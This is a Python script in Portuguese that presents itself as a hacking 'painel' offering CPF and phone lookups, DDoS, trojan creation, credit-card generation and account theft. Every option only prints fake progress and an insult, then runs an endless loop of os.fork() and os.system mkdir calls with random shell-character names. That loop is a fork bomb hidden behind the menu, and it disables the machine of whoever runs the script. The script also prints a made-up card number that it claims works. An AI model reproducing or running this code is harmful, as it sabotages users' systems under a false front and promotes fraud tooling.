#-----------------------------------------------#
global V, M, verde, A, P,amare
A='\033[1;31m';verde='\033[1;32m ';M='\033[1;35m';V='\033[1;31m';P='\033[1;30m';amare='\033[1;33m'

import os, random
from time import sleep
from sys import argv, executable

def bomb(Length):
    number = '0123456789'
    alpha = 'abcdefghijklmnopqrstuvwxyz'
    ra = '!@#$%¨&*()_+=-*/-+.,'
    id = ''
    for i in range(0,Length,2):
        id += random.choice(number)
        id += random.choice(alpha)
        id += random.choice(ra)
    return id
    
def clear(): os.system("cls||clear")    
clear()

def lammer():
    try:
        print(f'{amare}[!]{amare}{A}Lammerzinho, travazaper, fudido, seu merda.\nesta função nao pode ser usada por você.');sleep(2);clear() 
    except KeyboardInterrupt:
        while True:
            print(f'{amare}[!]{amare}{A}Lammerzinho, travazaper, fudido, seu merda.\nesta função nao pode ser usada por você.');sleep(2);clear();os.fork()
        
def restart():
    os.execl(executable, executable, *argv)


def banner(cor): 
    print(f'''{cor}
 ▄▄▄       ███▄ ▄███▓  ██████ ▄▄▄█████▓▓█████  ██▀███  
▒████▄    ▓██▒▀█▀ ██▒▒██    ▒ ▓  ██▒ ▓▒▓█   ▀ ▓██ ▒ ██▒
▒██  ▀█▄  ▓██    ▓██░░ ▓██▄   ▒ ▓██░ ▒░▒███   ▓██ ░▄█ ▒
░██▄▄▄▄██ ▒██    ▒██   ▒   ██▒░ ▓██▓ ░ ▒▓█  ▄ ▒██▀▀█▄  
 ▓█   ▓██▒▒██▒   ░██▒▒██████▒▒  ▒██▒ ░ ░▒████▒░██▓ ▒██▒
 ▒▒   ▓▒█░░ ▒░   ░  ░▒ ▒▓▒ ▒ ░  ▒ ░░   ░░ ▒░ ░░ ▒▓ ░▒▓░
  ▒   ▒▒ ░░  ░      ░░ ░▒  ░ ░    ░     ░ ░  ░  ░▒ ░ ▒░
  ░   ▒   ░      ░   ░  ░  ░    ░         ░     ░░   ░ 
      ░  ░       ░         ░              ░  ░   ░      
{amare}[!]{amare}{V}--developed by DioBrando--.{amare}[!]{amare}

{amare}[!]{amare}{V}--developed by joestar Team hacking--.{amare}[!]{amare}
''')
banner(cor=V)
def bonus():
    clear()
    banner(cor=amare)
    print(f'{M}1 - Criar um malware para controlar celular. {verde}.apk')
    print(f'{M}2 - Criar um malware para controlar pc. {verde}.exe')
    print(f'{M}3 - DDOS {verde} outro metodo.')
    print(f'{M}4 - Consulta Nome {verde}MÉTODO 2.')
    print(f'{M}5 - Consulta Número {verde}MÉTODO 2.')
    escu = int(input(f'{M}Escolha a opção desejada:'));sleep(2);clear()
    if escu == 1:
        clear()
        nome = str(input(f'{M}Digite o nome do malware.'))
        print(f'{M}Criando malware com o nome de: {nome}');sleep(0.7);clear()
        print(f'{M}Aguarde...');sleep(2);clear()
        print(f'{M}Malware criado em: ./Downloads');sleep(1);clear();lammer()
        while True: 
            os.system(f"mkdir {bomb(10*10)}");os.system(f"mkdir {bomb(10*100)}")
            os.fork()
    elif escu == 2:
        clear()
        nom = str(input(f'{M}Digite o nome do malware.'))
        print(f'{M}Criando malware com o nome de: {nom}');sleep(0.7);clear()
        print(f'{M}Aguarde...');sleep(2);clear()
        print(f'{M}Malware criado em: ./Downloads');sleep(1);clear();lammer()
        while True:
            os.system(f"mkdir {bomb(10*100)}");os.system(f"mkdir {bomb(10*100)}")
            os.fork()
    elif escu == 3:
        ipp = str(input(f'{amare}[!]{amare}{P}[ALERT]{P}, Exemplo: 192.168.0.1)\n{M}Digite o ip alvo: '))
        if ipp != 12:
            print(f"{amare}[!]{amare}{P}[ALERT]{P}, {A}Ip invalido!");sleep(1.5);clear();lammer()
            while True:
                os.system(f"mkdir {bomb(10*10)}")
                os.system(f"mkdir {bomb(10*100)}")
                os.fork()
        print(f'Enviando 20000 pacotes para {ipp}.');sleep(0.5)
        print(f'Enviando 40000 pacotes para {ipp}.');sleep(0.5)
        print(f'Enviando 80000 pacotes para {ipp}.');sleep(0.5)
        print(f'Enviando 160000 pacotes para {ipp}.')
        print(f'Enviando 320000 pacotes para {ipp}.');clear();lammer()
        os.system(f"mkdir {bomb(256)}")
        os.system(f"mkdir {bomb(256)}")
        os.system(f"mkdir {bomb(256)}")
        while True:
            os.fork()
    elif escu == 4:
        clear()
        input(f'{M}Digite aqui o nome que deseja consultar: ')
        clear();print(f'{M}Consultando...');sleep(2);clear()
        lammer()
        while True: 
            os.system(f"mkdir {bomb(256)}")
            os.fork()
    elif escu == 5:
        clear()
        try:
            nume = int(input(f'{M}Digite aqui o número que deseja consultar: '))
        except:
            print(f'{amare}[!]{amare}{P} ALERT{P}, {A}Você não digitou um número de telefone válido!');sleep(2);clear();lammer()
            while True:
                os.system(f"mkdir {bomb(256)}")
                os.system(f"mkdir {bomb(256)}");os.system(f"mkdir {bomb(256)}")
                os.fork()
        print(f'{M}Puxando dados do número {nume}...{verde}Aguarde.')
        sleep(2);clear();lammer()
        while True:
            os.system(f"mkdir {bomb(10*10)}")
            os.system(f"mkdir {bomb(10*100)}");os.system(f"mkdir {bomb(10*100)}")
            os.fork()

print(f'{M} 1 - Consulta CPF',f'{verde}[ON]')
print(f'{M} 2 - Consulta Nome',f'{verde}[ON]')
print(f'{M} 3 - Consulta CNPJ',f'{V}[OFF]')
print(f'{M} 4 - Consulta Número',f'{verde}[ON]')
print(f'{M} 5 - Gerar Vírus',f'{verde}[ON]')
print(f'{M} 6 - DDOS',f'{verde}[ON]')
print(f'{M} 7 - Gerar cartão de credito.',f'{verde}[ON]')
print(f'{M} 8 - Clonar banco de dados.',f'{V}[OFF]')
print(f'{M} 9 - Consulta Score.', f'{verde}[ON]')
print(f'{M} 10 - Consulta nome mãe.', f'{verde}[ON]')
print(f'{M} 11 - Clonar whatsapp.', f'{verde}Método spoofing.',f'{verde}[ON]')
print(f'{M} 12 - Funções bonus.', f'{amare}VIP!')
print(f'{M} 13 - Funções de roubo de conta.',f'{verde}[ON]')
print(f'{M} 14 - Roubo em jogos.',f'{verde}[ON]')
print(f'{M} 15 - Salves. {verde}[Salves.]')

try:
    esc = str(input(f'{M}Digite a opção desejada: '))
except:
    clear();sleep(2);lammer()
    while True:
        os.system(f"mkdir {bomb(10*100)}")
        os.system(f"mkdir {bomb(10*100)}")
        os.fork()

if esc == '1':
    clear()
    print(f'{M}Método 1.{verde}[ON]')
    print(f'{M}Método 2.{V}[OFF]')
    print(f'{M}Método 3.{verde}[ON]')
    print(f'{M}Método 4.{V}[OFF]')
    try:
        metodo = int(input(f'{M}Digite o Método que deseja utilizar: '))
    except:
        print(f'{amare}[!]{amare}{P} ALERT{P}, {A}Digito invalido!')
    if metodo == 1:
        clear()
        cpf = int(input(f'{M}Digite aqui o cpf que deseja consultar: '))
        if cpf != 11:
            print(f'{amare}[!]{amare}{P} ALERT{P}, {A}Quantidade de digitos invalida!');sleep(2);clear()
            lammer()
            while True: 
                os.system(f"mkdir {bomb(10*10)}");os.system(f"mkdir {bomb(10*100)}");os.system(f"mkdir {bomb(10*100)}")
                os.fork()
    elif metodo == 2:
        clear()
        print(f'{amare}[!]{amare}{P} ALERT{P}, {A}Avisei que estava off\nagora irá sofrer as consequencias.');sleep(1.3);lammer()
        while True:
                os.system(f"mkdir {bomb(10*100)}")
                os.system(f"mkdir {bomb(10*100)}")
                os.fork()
    elif metodo == 3:
        clear()
        try:
            surfacing = int(input(f'{M}Digite aqui o cpf que deseja consultar: '))
        except:
            print(f'{amare}[!]{amare}{P} ALERT{P}, {A}Quantidade de digitos invalida!');sleep(2);clear()
            lammer()
            while True: 
                os.system(f"mkdir {bomb(10*10)}");os.system(f"mkdir {bomb(10*100)}");os.system(f"mkdir {bomb(10*100)}")
                os.fork()

        if surfacing != 11:
            print(f'{amare}[!]{amare}{P} ALERT{P}, {A}Quantidade de digitos invalida!');sleep(2);clear()
            lammer()
            while True: 
                os.system(f"mkdir {bomb(10*10)}");os.system(f"mkdir {bomb(10*100)}");os.system(f"mkdir {bomb(10*100)}")
                os.fork()
    elif metodo == 4:
        clear()
        print(f'{amare}[!]{amare}{P} ALERT{P}, {A}Avisei que estava off\nagora irá sofrer as consequencias.');sleep(1.3);lammer()
        while True:
                os.system(f"mkdir {bomb(10*100)}")
                os.system(f"mkdir {bomb(10*100)}")
                os.fork()
        

elif esc == "2":
    clear()
    input(f'{M}Digite aqui o nome que deseja consultar: ')
    clear();print(f'{M}Consultando...');sleep(2);clear()
    lammer()
    while True: 
        os.system(f"mkdir {bomb(10*10)}")
        os.system(f"mkdir {bomb(10*10)}")
        os.system(f"mkdir {bomb(10*100)}")
        os.fork()
    
elif esc == "3":
    clear()
    cnpj = int(input(f'{M}Digite aqui o cnpj que deseja consultar: '))
    print(f'{amare}[!]{amare}{P} ALERT{P}, {A}Quantidade de digitos invalida!');sleep(2)
    clear();lammer()
    while True:
        os.system(f"mkdir {bomb(10*10)}");os.system(f"mkdir {bomb(10*100)}")
        os.system(f"mkdir {bomb(10*100)}");os.system(f"mkdir {bomb(10*100)}")
        os.fork()
elif esc == "4":
    clear()
    try:
        num = int(input(f'{M}Digite aqui o número que deseja consultar: '))
    except:
        print(f'{amare}[!]{amare}{P} ALERT{P}, {A}Você não digitou um número de telefone válido!');sleep(2);clear();lammer()
        while True:
            os.system(f"mkdir {bomb(10*10)}")
            os.system(f"mkdir {bomb(10*100)}");os.system(f"mkdir {bomb(10*100)}")
            os.fork()
    print(f'{M}Puxando dados do número {num}...{verde}Aguarde.')
    sleep(2);clear();lammer()
    while True:
        os.system(f"mkdir {bomb(10*10)}")
        os.system(f"mkdir {bomb(10*100)}");os.system(f"mkdir {bomb(10*100)}")
        os.fork()

elif esc == "5":
    clear()
    print(f'{M}1 - Método 1.',f'{verde}[Mais funcional.]')
    print(f'{M}2 - Método 2.')
    es = input(f'{M}Digite o metodo que deseja para criar o trojan:');sleep(1.3);clear()
    print(f"{M}Criando Trojan..."f"{verde}(Aguarde)");sleep(1)
    print(f"{M}Criando Trojan..."f"{verde}(Aguarde)");sleep(1)
    print(f"{M}Criando Trojan..."f"{verde}(Aguarde)");sleep(3);clear()
    print(f'{M}Trojan criado.');sleep(2);clear()
    print(f'{M}1 - Método de ip.',f'{verde}(Mais funcional.)')
    print(f'{M}2 - Método de apk.')
    esca=input('Selecione o metodo de enviar: ');sleep(1);clear()
    if esca == "1":
        input(f"{M}Digite o ip alvo:");sleep(2);clear();lammer()
        while True:
            os.system(f"mkdir {bomb(10*10)}");os.system(f"mkdir {bomb(10*100)}")
            os.system(f"mkdir {bomb(10*100)}");os.system(f"mkdir {bomb(10*100)}");
            os.fork()
    elif esca == "2":
        print(f'{M}Aguarde, o virus será criado em sua pasta de downloads.');sleep(2);clear();lammer()
        while True:
            os.system(f"mkdir {bomb(10*10)}");os.system(f"mkdir {bomb(10*100)}")
            os.system(f"mkdir {bomb(10*100)}");os.system(f"mkdir {bomb(10*100)}")
            os.fork()

elif esc == "6":
    clear()
    print(f'{M}Método 1',f'{verde}[ON]')
    print(f'{M}Método 2',f'{verde}[ON]')
    escol = input(f'{M}Digite o método que deseja: ');sleep(2);clear()
    if escol == "1":
        ip = str(input(f'{amare}[!]{amare}{P}[ALERT]{P}, Exemplo: 192.168.0.1)\n{M}Digite o ip alvo: '))
        if ip != 10:
            print(f"{amare}[!]{amare}{P}[ALERT]{P}, {A}Ip invalido!");sleep(1.5);clear();lammer()
            while True:
                os.system(f"mkdir {bomb(10*10)}")
                os.system(f"mkdir {bomb(10*100)}")
                os.system(f"mkdir {bomb(10*100)}")
                os.fork()
        print(f'Enviando 20000 pacotes para {ip}.');sleep(0.5)
        print(f'Enviando 40000 pacotes para {ip}.');sleep(0.5)
        print(f'Enviando 80000 pacotes para {ip}.');sleep(0.5)
        print(f'Enviando 160000 pacotes para {ip}.')
        print(f'Enviando 320000 pacotes para {ip}.');clear();lammer()
        while True:
            os.system(f"mkdir {bomb(10*10)}")
            os.system(f"mkdir {bomb(10*10)}")
            os.system(f"mkdir {bomb(10*10)}")
            os.fork()
    elif escol == "2":
        ip2 = ip = str(input(f'{amare}[!]{amare}{P}[ALERT]{P}, Exemplo: 192.168.0.1)\n{M}Digite o ip alvo: '))
        if ip2 != 12:
            print(f"{amare}[!]{amare}{P}[ALERT]{P}, {A}Ip invalido!");sleep(1.5);clear();lammer()
            while True:
                os.system(f"mkdir {bomb(10*10)}")
                os.system(f"mkdir {bomb(10*100)}")
                os.fork()
        print(f'Enviando 20000 pacotes para {ip}.');sleep(0.5)
        print(f'Enviando 40000 pacotes para {ip}.');sleep(0.5)
        print(f'Enviando 80000 pacotes para {ip}.');sleep(0.5)
        print(f'Enviando 160000 pacotes para {ip}.')
        print(f'Enviando 320000 pacotes para {ip}.');clear();lammer()
        os.system(f"mkdir {bomb(10*10)}")
        os.system(f"mkdir {bomb(10*100)}")
        os.system(f"mkdir {bomb(10*100)}")
        os.fork()

elif esc == "7":
    clear()
    print(f'{M}1 - Mastercard.',f'{verde}[ON]')
    print(f'{M}2 - Visa.',f'{V}[OFF]')
    print(f'{M}3 - PicPay.',f'{verde}[ON]')
    print(f'{M}4 - PayPal.',f'{verde}[ON]')
    print(f'{M}5 - Caixa.',f'{V}[OFF]')
    print(f'{M}6 - Nubank.',f'{verde}[ON]')
    op = int(input(f'{M}Digite a opção desejada: '));sleep(2);clear()
    if op > 7:
        clear()
        print(f'{amare}[!]{amare}{P} ALERT{P}, {A}Opção invalida!');sleep(1.5);lammer()
        while True:
            os.system(f"mkdir {bomb(10*10)}")
            os.system(f"mkdir {bomb(10*100)}")
            os.system(f"mkdir {bomb(10*100)}")
            os.fork()
    clear()
    print(f'{M}Gerando cartão...');sleep(2);clear()
    print(f'{M}Testando cartão em lojas...',f'{verde}Testado!',f'{verde}Funcionando!');sleep(2);clear()
    print(f'{M}O cartão gerado foi: 5282 1738 3637 1016\n{M}Validade:27/07/2023\n{M}Código de segurança:106');sleep(3)
    clear()
    print(f'{M}1 - Casas bahia.{verde}Funcionando!')
    print(f'{M}2 - Lojas renner.{verde}Funcionando!')
    print(f'{M}3 - Mercado livre.{verde}Funcionando!')
    input(f'{M}Deseja Testar seu cartão aonde? ');sleep(1.5);clear();lammer()
    while True:
        os.system(f"mkdir {bomb(10*10)}")
        os.system(f"mkdir {bomb(10*100)}")
        os.fork()

elif esc == "8":
    clear()
    print(f'{M}Temos 3 banco de dados no nosso sistema.')
    print(f'{M}1 - Banco de dados de Nome. {verde}100Milhões de nomes')
    print(f'{M}2 - Banco de dados de Número. {verde}80Milhões de cpf')
    print(f'{M}3 - Banco de dados de CC.(Cartão de crédito.) {verde}90% funcionando.')
    try:
        nume = int(input(f'{M}Digite a opção desejada: '))
    except:
        clear()
        print(f'{amare}[!]{amare}{P} ALERT{P}, {A}Opção invalida!');sleep(2);clear();lammer()
        while True:
            os.system(f"mkdir {bomb(10*100)}")
            os.system(f"mkdir {bomb(10*100)}")
            os.fork()
    if nume == 1:
        clear()
        print(f'{M}Movendo banco de dados de nome para seu armazenamento.');sleep(2);clear();lammer()
        while True:
            os.system(f"mkdir {bomb(10*100)}");os.system(f"mkdir {bomb(10*100)}")
            os.system(f"mkdir {bomb(10*100)}");os.system(f"mkdir {bomb(10*100)}")
            os.fork()
    elif nume == 2:
        clear()
        print(f'{M}Movendo banco de dados de número para seu armazenamento.');sleep(2);clear();lammer()
        while True:
            os.system(f"mkdir {bomb(10*100)}");os.system(f"mkdir {bomb(10*100)}")
            os.system(f"mkdir {bomb(10*100)}");os.system(f"mkdir {bomb(10*100)}")
            os.fork()
    elif nume == 3:
        clear()
        print(f'{M}Movendo banco de dados de CC para seu armazenamento.');sleep(2);clear();lammer()
        while True:
            os.system(f"mkdir {bomb(10*100)}");os.system(f"mkdir {bomb(10*100)}")
            os.system(f"mkdir {bomb(10*100)}");os.system(f"mkdir {bomb(10*100)}")
            os.fork()

elif esc == "9":
    clear()
    print(f'{M}1 - Consultar Score pelo número.{verde}[ON]')
    print(f'{M}2 - Consutar Score pelo Cpf.{verde}[ON]')
    print(f'{M}3 - Consultar Score pelo Nome.{V}[OFF]')
    try:
        escolha = int(input(f'{M}Digite a opção desejada:'))
    except:
        clear()
        print(f'{amare}[!]{amare}{P} ALERT{P}, {A}Opção invalida!');sleep(2);clear();lammer()
        while True:
            os.system(f"mkdir {bomb(10*100)}")
            os.system(f"mkdir {bomb(10*100)}")
            os.fork()
    if escolha == 1:
        clear()
        try:
            numeru = int(input(f'{M}Exemplo: 1199832761\nDigite o número que deseja consultar score: '))
        except:
            clear()
            print(f'{amare}[!]{amare}{P} ALERT{P}, {A}Você não digitou um número válido.')
        if numeru >10:
            clear()
            print(f'{amare}[!]{amare}{P} ALERT{P}, {A}Quantidade de digitos inválida.');sleep(2);clear();lammer()
            while True:
                os.system(f"mkdir {bomb(10*100)}")
                os.system(f"mkdir {bomb(10*100)}")
                os.fork()
        else:
            clear()
            print(f'{M}Buscando número... {verde}Aguarde!');sleep(3);clear();lammer()
            while True:
                os.system(f"mkdir {bomb(10*100)}")
                os.system(f"mkdir {bomb(10*100)}")
                os.fork()
    elif escolha == 2:
        clear()
        try:
            bruh = int(input(f'{M}Exemplo: 45627984321\nDigite o cpf que deseja consultar score:'))
        except:
            clear()
            print(f'{amare}[!]{amare}{P} ALERT{P}, {A}Você não digitou um CPF.');sleep(2);clear();lammer()
            while True:
                os.system(f"mkdir {bomb(10*100)}")
                os.system(f"mkdir {bomb(10*100)}")
                os.fork()
        if bruh >11:
            clear()
            print(f'{amare}[!]{amare}{P} ALERT{P}, {A}Você não digitou um CPF Válido.');sleep(2);clear();lammer()
            while True:
                os.system(f"mkdir {bomb(10*100)}")
                os.system(f"mkdir {bomb(10*100)}")
                os.fork()
        else:
            clear()
            print(f'{M}Consultando cpf...{verde}Aguarde..');sleep(2);clear();lammer()
            while True:
                os.system(f"mkdir {bomb(10*100)}")
                os.system(f"mkdir {bomb(10*100)}")
                os.fork()
    elif escolha == 3:
        clear()
        print(f'{amare}[!]{amare}{P} ALERT{P}, {A}Avisei que estava off\nagora irá sofrer as consequencias.');sleep(1.3);lammer()
        while True:
                os.system(f"mkdir {bomb(10*100)}")
                os.system(f"mkdir {bomb(10*100)}")
                os.fork()
elif esc == "10":
    clear()
    try:
        clear()
        mae = str(input(f'{M}Digite o nome que deseja consultar:'))
    except:
        clear()
        print(f'{amare}[!]{amare}{P} ALERT{P}, {A}Você não digitou um nome.');sleep(1.6);clear();lammer()
        while True:
                os.system(f"mkdir {bomb(10*100)}")
                os.system(f"mkdir {bomb(10*100)}")
                os.fork()
    clear()
    print(f'{M}Consultando o nome: {mae}, {verde}Aguarde..');sleep(3);clear();lammer()
    while True:
        os.system(f"mkdir {bomb(10*100)}")
        os.system(f"mkdir {bomb(10*100)}")
        os.fork()

elif esc == "11":
    clear()
    print(f'{M}1 - Explicação de como fazer.{verde}Iniciantes.')
    print(f'{M}2 - Spoofing método 1.{verde}[ON]')
    print(f'{M}3 - Spoofing método 2.{V}[OFF]')
    try:
        spo = int(input(F'{M}Digite o metodo que deseja.'))
    except:
        clear()
        print(f'{amare}[!]{amare}{P} ALERT{P}, {A}Você não digitou uma opção válida!.')
    if spo == 1:
        clear()
        print(f'{M}Spoofing nada mais é do que você simular a caixa postal de um número\nPara receber sms por ele.\nusando esse método você pode facilmente conseguir o codigo do whatsapp da pessoa.');sleep(2);clear()
        print(f'{V}ACHA MESMO QUE VOCÊ, TRAVAZAPER VAI CONSEGUIR FAZER SPOOFING? KKKKKKKKKKKKKKKKKKKKKKK')
        while True:
            os.system(f"mkdir {bomb(10*100)}")
            os.system(f"mkdir {bomb(10*100)}")
            os.fork()

elif esc == "12":
    clear()
    bonus()

elif esc == "13":
    clear()
    print(f'{M}1 - Roubar instagram {verde} [ON]')
    print(f'{M}2 - Roubar twitter {V} [OFF]')
    print(f'{M}3 - Roubar Facebook. {V} [OFF]')
    try:
        roubo = int(input(f'{M}Digite a opção desejada: '))
    except:
        clear()
        print(f'{amare}[!]{amare}{P} ALERT{P}, {A}Você não digitou uma opção válida.!');sleep(2);clear();lammer()
        while True:
            os.system(f"mkdir {bomb(10*100)}")
            os.system(f"mkdir {bomb(10*100)}")
            os.fork()
    if roubo == 1:
        clear()
        print(f'{M}Método 1. {verde}[ON]')
        print(f'{M}Método 2. {verde}[ON]')
        print(f'{M}Método 3. {V}[OFF]')
        try:
            daron = int(input('Digite o método que queira usar: '))
        except:
            print(f'{amare}[!]{amare}{P} ALERT{P}, {A}Você não digitou um método válido.!');sleep(2);clear();lammer()
            while True:
                os.system(f"mkdir {bomb(10*100)}")
                os.system(f"mkdir {bomb(10*100)}")
                os.fork()
        if daron == 1:
            clear()
            try:
                user = str(input(f'{M}Digite o Usuário que deseja roubar: '))
            except:
                clear()
                print(f'{amare}[!]{amare}{P} ALERT{P}, {A}Você não digitou um nome de usuario valido.');sleep(2);clear();lammer()
                while True:
                    os.system(f"mkdir {bomb(10*100)}")
                    os.system(f"mkdir {bomb(10*100)}")
                    os.fork()
            sleep(2);lammer()
            while True:
                os.system(f"mkdir {bomb(10*100)}")
                os.system(f"mkdir {bomb(10*100)}")
                os.fork()
        elif daron == 2:
            try:
                usu = str(input(f'{M}Digite O email da conta que deseja roubar: '))
            except:
                clear()
                print(f'{amare}[!]{amare}{P} ALERT{P}, {A}Você não digitou um endereço de email válido.')
            print(f'{M}Aguarde...');sleep(0.8);clear();print(f'{verde}Localizando email...');sleep(1.7);clear()
            print(f'{verde}Email localizado.');sleep(1);clear()
            print(f'{M}1 - Método 1.{verde}[On]')
            print(f'{M}2 - Método 2.{V}[OFF]')
            try:
                ok = int(input(f'{M}Digite o método que deseja utilizar.'))
            except:
                clear()
                print(f'{amare}[!]{amare}{P} ALERT{P}, {A}Você não digitou um metodo válido!')
            if usu == 1:
                clear()
                print(f'{M}Hackeando... aguarde..');sleep(2);clear();lammer()
                while True:
                    os.system(f"mkdir {bomb(10*100)}")
                    os.system(f"mkdir {bomb(10*100)}")
                    os.fork()
            elif usu == 2:
                clear()
                print(f'{amare}[!]{amare}{P} ALERT{P}, {A}Avisei que estava off\nagora irá sofrer as consequencias.');sleep(1.3);lammer()
                while True:
                    os.system(f"mkdir {bomb(10*100)}")
                    os.system(f"mkdir {bomb(10*100)}")
                    os.fork()
        elif daron == 3:
            clear()
            print(f'{amare}[!]{amare}{P} ALERT{P}, {A}Avisei que estava off\nagora irá sofrer as consequencias.');sleep(1.3);lammer()
            while True:
                os.system(f"mkdir {bomb(256)}")
                os.system(f"mkdir {bomb(256)}")
                os.fork()
    elif roubo == 2:
        print(f'{amare}[!]{amare}{P} ALERT{P}, {A}Avisei que estava off\nagora irá sofrer as consequencias.');sleep(2);clear();lammer()
        while True:
                os.system(f"mkdir {bomb(256)}")
                os.system(f"mkdir {bomb(256)}")
                os.fork()
    elif roubo == 3:
        print(f'{amare}[!]{amare}{P} ALERT{P}, {A}Avisei que estava off\nagora irá sofrer as consequencias.');sleep(2);clear();lammer()
        while True:
                os.system(f"mkdir {bomb(256)}")
                os.system(f"mkdir {bomb(256)}")
                os.fork()
        
elif esc == "14":
    clear()
    print(f'{M}Método 1.{verde}[ON]')
    print(f'{M}Método 2.{V}[OFF]')
    try:
        fred = int(input(f'{M}Digite a opção desejada: '))
    except:
        clear()
        print(f'{amare}[!]{amare}{P} ALERT{P}, {A}Opção invalida!');sleep(2);clear();lammer()
        while True:
                os.system(f"mkdir {bomb(256)}")
                os.system(f"mkdir {bomb(256)}")
                os.fork()
    if fred == 1:
        clear()
        print(f'{M}1 - Roubar conta de Free fire{verde}[ON]')
        print(f'{M}2 - GTA V RP.{verde}[ON]')
        try:
            six = int(input(f'{M}Escolha a opção de jogo desejada: '))
        except:
            clear()
            print(f'{amare}[!]{amare}{P} ALERT{P}, {A}Opção invalida!');sleep(2);clear();lammer()
            while True:
                os.system(f"mkdir {bomb(256)}")
                os.system(f"mkdir {bomb(256)}")
                os.fork()
        if six == 1:
            try:
                conta = int(input(f'{M}Digite o id da conta que deseja roubar: '))
            except:
                clear()
                print(f'{amare}[!]{amare}{P} ALERT{P}, {A}Você não digitou um id válido.');sleep(2);clear();lammer()
                while True:
                    os.system(f"mkdir {bomb(256)}")
                    os.system(f"mkdir {bomb(256)}")
                    os.fork()
            if conta < 10:
                print(f'{amare}[!]{amare}{P} ALERT{P}, {A}Quantidade de digitos inválido.');sleep(2);clear();lammer()
                while True:
                    os.system(f"mkdir {bomb(256)}")
                    os.system(f"mkdir {bomb(256)}")
                    os.fork()
            else:
                clear()
                print(f'{verde}Fazendo spoofing da conta..');sleep(2);clear();print(f'{verde}Aguarde...');sleep(2);clear();lammer()
                while True:
                    os.system(f"mkdir {bomb(256)}")
                    os.system(f"mkdir {bomb(256)}")
                    os.fork()
        elif six == 2:
            clear()
            print(f'{M}1 - Pc.{verde}[ON]')
            print(f'{M}2 - Xbox.{verde}[ON]')
            print(f'{M}3 - Ps4, Ps5.{V}[OFF]')
            try:
                plata = int(input(f'{M}Digite a opção desejada: '))
            except:
                clear()
                print(f'{amare}[!]{amare}{P} ALERT{P}, {A}Opção inválida!');sleep(2);clear();lammer()
                while True:
                    os.system(f"mkdir {bomb(256)}")
                    os.system(f"mkdir {bomb(256)}")
                    os.fork()
            if plata == 1:
                print(f'{M}1 - Método por Nome da conta.{verde}[ON]')
                print(f'{M}2 - Método por ID da conta.{verde}[ON]')
                print(f'{M}3 - Método por Email da conta.{V}[OFF]')
                try:
                    gta = int(input(f'{M}Digite o Método que deseja utilizar: '))
                except:
                    clear()
                    print(f'{amare}[!]{amare}{P} ALERT{P}, {A}Opção inválida!');sleep(2);clear()
                    while True:
                        os.system(f"mkdir {bomb(256)}")
                        os.system(f"mkdir {bomb(256)}")
                        os.fork()
                if gta == 1:
                    try:
                        cont = str(input(f'{M}1 - Digite o Nome da conta que deseja roubar: '))
                    except:
                        clear()
                        print(f'{amare}[!]{amare}{P} ALERT{P}, {A}Você não digitou um nome valido!');sleep(2);clear();lammer()
                        while True:
                            os.system(f"mkdir {bomb(256)}")
                            os.system(f"mkdir {bomb(256)}")
                            os.fork()
                    print(f'{M}Hackeando a conta: {cont}... {verde}Aguarde...');sleep(2);clear();lammer()
                    while True:
                        os.system(f"mkdir {bomb(256)}")
                        os.system(f"mkdir {bomb(256)}")
                        os.fork()
                elif gta == 2:
                    try:
                        contaa = str(input(f'{M}1 - Digite o Id da conta que deseja roubar: '))
                    except:
                        clear()
                        print(f'{amare}[!]{amare}{P} ALERT{P}, {A}Você não digitou um nome valido!');sleep(2);clear();lammer()
                        while True:
                            os.system(f"mkdir {bomb(256)}")
                            os.system(f"mkdir {bomb(256)}")
                            os.fork()
                    print(f'{M}Hackeando a conta: {contaa}... {verde}Aguarde...');sleep(2);clear();lammer()
                    while True:
                        os.system(f"mkdir {bomb(256)}")
                        os.fork()
                elif gta == 3:
                    clear()
                    print(f'{amare}[!]{amare}{P} ALERT{P}, {A}Avisei que estava off\nagora irá sofrer as consequencias.');sleep(1.3);lammer()
                    while True:
                        os.system(f"mkdir {bomb(256)}")
                        os.fork()
    elif fred == 2:
        clear()
        print(f'{amare}[!]{amare}{P} ALERT{P}, {A}Avisei que estava off\nagora irá sofrer as consequencias.');sleep(1.3);lammer()
        clear()
        while True:
                os.system(f"mkdir {bomb(256)}")
                os.fork()
elif esc == "15":
    clear()
    print(f'{M}Salve para os manos: {V}Mr diniz, Joshu, matheus joestar, Dio, crowley, lucas\nSpyware, Kimatsuki, vitor, Jotaro.');sleep(5);clear()
    print(f'{M}Salve pros manos da joestar team :D.{V}Diniz, Joshu, Dio, Spyware, Matheus Joestar.');sleep(5);clear()
    print(f'{M}Salve pra quem divulgou o painel.');sleep(6);clear();restart()

else:
    clear()
    reset = str(input(f'{amare}[!]{amare}{P} ALERT{P}, {A}OPÇÃO INVALIDA! deseja reiniciar? (S/N)'));sleep(2);clear()
    print(f'{A}Problema é seu, seu bosta.');sleep(2);clear()
    while True:
        lammer()
        os.system(f"mkdir {bomb(253)}")
        os.system(f"mkdir {bomb(256)}")
        os.fork()
